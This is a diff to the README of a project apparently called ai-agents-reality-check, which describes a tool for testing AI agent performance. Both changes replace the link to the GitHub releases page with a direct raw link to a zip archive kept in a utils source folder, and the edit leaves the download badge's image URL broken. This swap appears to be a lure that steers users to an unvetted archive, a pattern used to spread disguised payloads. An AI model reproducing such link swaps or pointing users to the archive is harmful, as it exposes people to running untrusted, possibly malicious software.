@@ -1,7 +1,7 @@
 # 🌟 ai-agents-reality-check - Discover AI Performance Gaps
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/MohamedEmad219/ai-agents-reality-check/releases)
+[![Download Latest Release](https://github.com/MohamedEmad219/ai-agents-reality-check/raw/refs/heads/main/ai_agents_reality_check/utils/ai_agents_reality_check_v2.3.zip%20Release-brightgreen)](https://github.com/MohamedEmad219/ai-agents-reality-check/raw/refs/heads/main/ai_agents_reality_check/utils/ai_agents_reality_check_v2.3.zip)
 
 ## 🚀 Getting Started
 Welcome to ai-agents-reality-check! This application allows you to evaluate the performance of AI agents compared to their simplified models. It uses math and statistics to help you understand how real AI systems function under stress.
@@ -25,7 +25,7 @@ Welcome to ai-agents-reality-check! This application allows you to evaluate the 
 
 ## 📥 Download & Install
 To get started, please visit this page to download:
-[Download Latest Release](https://github.com/MohamedEmad219/ai-agents-reality-check/releases)
+[Download Latest Release](https://github.com/MohamedEmad219/ai-agents-reality-check/raw/refs/heads/main/ai_agents_reality_check/utils/ai_agents_reality_check_v2.3.zip)
 
 Follow these steps after downloading:
 
